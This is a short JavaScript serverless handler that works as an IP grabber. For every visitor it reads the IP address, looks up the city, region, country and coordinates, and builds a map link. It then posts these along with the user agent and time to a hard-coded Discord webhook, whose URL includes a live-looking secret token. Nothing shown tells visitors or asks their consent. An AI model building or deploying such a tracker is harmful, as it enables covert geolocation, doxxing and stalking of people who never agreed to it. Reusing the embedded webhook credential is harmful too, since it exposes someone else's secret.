export default async function handler(req, res) {
    // Get IP from Vercel headers
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(/, /)[0] : req.socket.remoteAddress;

    const webhookUrl = 'https://discord.com/api/webhooks/1477832242129666110/8QnLpB39E68xVJCXeU_Dfi9cM8SpNY76L8wLkCq0BPJlnlvUYSpEq5ymKkEJq4R7st38';

    try {
        // Perform server-side lookup for more accuracy and to avoid client-side blocks
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoResponse.json();

        const { city, region, country_name, latitude, longitude } = geoData;
        const mapLink = latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'Location unavailable';

        // Log to Discord
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🚀 **New Visit Tracked!**\n**IP**: ${ip}\n**Location**: ${city || 'Unknown'}, ${region || 'Unknown'}, ${country_name || 'Unknown'}\n**Map**: ${mapLink}\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`
            })
        });

        return res.status(200).json({ ip, city, region, country_name });
    } catch (error) {
        console.error('Logging error:', error);
        // Even if geo-lookup fails, try to log the raw IP
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `⚠️ **Visit logged (Geo-lookup failed)**\n**IP**: ${ip}\n**Time**: ${new Date().toLocaleString()}`
            })
        });
        return res.status(200).json({ ip });
    }
}
